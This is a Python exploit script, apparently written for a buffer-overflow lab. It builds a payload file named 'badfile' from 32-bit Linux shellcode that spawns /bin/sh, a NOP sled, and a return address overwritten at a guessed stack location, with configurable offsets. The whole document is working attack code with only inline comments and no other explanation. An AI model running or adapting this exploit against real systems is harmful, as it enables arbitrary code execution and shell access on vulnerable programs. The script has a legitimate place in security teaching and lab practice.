#!/usr/bin/python3
import sys

# Define the 32-bit Linux /bin/sh shellcode
shellcode= (
    "\x31\xc0"              # xorl    %eax,%eax
    "\x50"                  # pushl   %eax
    "\x68""//sh"            # pushl   $0x68732f2f
    "\x68""/bin"            # pushl   $0x6e69622f
    "\x89\xe3"              # movl    %esp,%ebx
    "\x50"                  # pushl   %eax
    "\x53"                  # pushl   %ebx
    "\x89\xe1"              # movl    %esp,%ecx
    "\x99"                  # cdq
    "\xb0\x0b"              # movb    $0x0b,%al
    "\xcd\x80"              # int     $0x80
).encode('latin-1')

# --- EXPLOIT CONFIGURATION (MANDATORY VALUES) ---
# NOTE: These values are placeholders and must be verified against your target program using a debugger.
BUFFER_SIZE = 517
RET_OFFSET = 500
RET_ADDRESS = 0xbffffd00  # Common stack address guess for 32-bit Linux
SHELLCODE_START = 100
# --- END CONFIGURATION ---

# Calculate total length needed to fill the buffer plus the 4 bytes for the return address
TOTAL_LENGTH = RET_OFFSET + 4

# Fill the content array entirely with NOPs (\x90) to create the NOP sled
content = bytearray(b'\x90' * TOTAL_LENGTH)

# Put the shellcode into the NOP sled starting at SHELLCODE_START
start = SHELLCODE_START
# Correct slice assignment for the shellcode
content[start:start + len(shellcode)] = shellcode

# Calculate the return address in little-endian format
ret = RET_ADDRESS

# Overwrite the Return Address section with the calculated address
# Correct slice assignment for the return address
content[RET_OFFSET:RET_OFFSET + 4] = (ret).to_bytes(4, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)

print("Generated 'badfile' of length {} bytes.".format(len(content)))
print("Return Address (RET) set to: 0x{:x} (Little Endian)".format(RET_ADDRESS))
print("Shellcode placed starting at index: {}".format(SHELLCODE_START))
